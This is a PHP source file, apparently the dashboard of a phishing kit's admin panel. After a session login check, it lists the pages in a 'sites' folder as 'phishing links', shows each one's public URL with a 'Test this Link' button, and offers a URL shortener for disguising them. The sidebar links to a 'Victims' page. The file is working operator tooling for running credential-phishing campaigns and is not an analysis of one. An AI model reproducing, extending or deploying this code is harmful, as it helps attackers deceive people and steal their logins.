<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
	header("location:login.php");
	exit;
}
?>


<?php
echo'<meta charset=UTF-8><link rel=stylesheet type=text/css href=./style.css>';echo'<script>function aps(){document.getElementById("hello").contentWindow.location.reload();}</script>';$dir='.././sites';$efg=$_SERVER['REQUEST_URI'];$pat=explode('/',$efg);$cds=$_SERVER['SERVER_NAME'];for($i=0;$i<count($pat)- 2;$i++){$cds.=$pat[$i]."/";}$hgf="http://".$cds."sites/";

echo'
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  font-family:courier;
}

.sidebar {
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

.sidebar a {
  display: block;
  color: black;
  padding: 16px;
  text-decoration: none;
}
 
.sidebar a.active {
  background-color: #4CAF50;
  color: white;
}

.sidebar a:hover:not(.active) {
  background-color: #555;
  color: white;
}

div.content {
  margin-left: 200px;
  padding: 1px 16px;
  height: 1000px;
}

@media screen and (max-width: 700px) {
  .sidebar {
    width: 100%;
    height: auto;
    position: relative;
  }
  .sidebar a {float: left;}
  div.content {margin-left: 0;}
}

@media screen and (max-width: 400px) {
  .sidebar a {
    text-align: center;
    float: none;
  }
}
</style>
</head>
<body>

<div class="sidebar">
<br>
<h3><center>PHISHING<br>LINKS</center></h3>

  <a  href="./home.php"><b>Home</b></a>
  <a class="active" href="./dashboard.php"><b>Links</b></a>
  <a href="./advance/index.php"><b>Settings</b></a>
  
  <a href="./victims.php"><b>Victims</b</a>
  <a href="./logout.php"><b>Logout</b></a>
</div>

<body style=background-color:#000><font face="courier"><br><center><font color=#FFF><br><br><h1 style=font-size:40px;>Select any phishing link you want</h1></center><br><center><a href=https://www.shorturl.at/ target="_blank"><button style="background-color:#000;color:white;border:5px solid #FFF;text-align:center;height:50px;width:160px;"><b style="font-family:courier;">Shorten</b></button></a></h1></font><br><br><hr>';echo'<script>var coll = document.getElementsByClassName("collapsible");var i;for (i = 0; i < coll.length; i++) {coll[i].addEventListener("click", function() {this.classList.toggle("active");var content = this.nextElementSibling;if (content.style.display === "block") {content.style.display = "none";} else {content.style.display = "block";}});}</script>';if($handle=opendir($dir)){while(false!==($entry=readdir($handle))){$add=ucfirst(str_replace('.php','',$entry));if($entry!='.'&&$entry!='..'&&$entry!='post_database.php'&&$entry!='post_in_file.php'&&$entry!='meta_tags.html'&&$entry!='index.php'&&$entry!='dashboard.php'&&$entry!='logout.php'&&$entry!='phishing_info'){echo'<body><div><center><p style=color:white;font-size:large;><b style=font-size:25px>'.$add.'</b></p></center><center><textarea style=margin-left:-7px; cols=40 rows=3>'.$hgf.$entry.'</textarea></center></div><center><font color=#FFF><br><br><a href='.$hgf.$entry.' target="_blank"><button style="background-color:#000;color:white;border:5px solid #FFF;text-align:center;height:50px;width:160px;"><b style="font-family:courier;">Test this Link</b></button></a></font></center><br><br><hr>';}}echo'<br><br>';closedir($handle);}else{echo'<script>window.location.replace("./index.php");</script></html>';}

?>


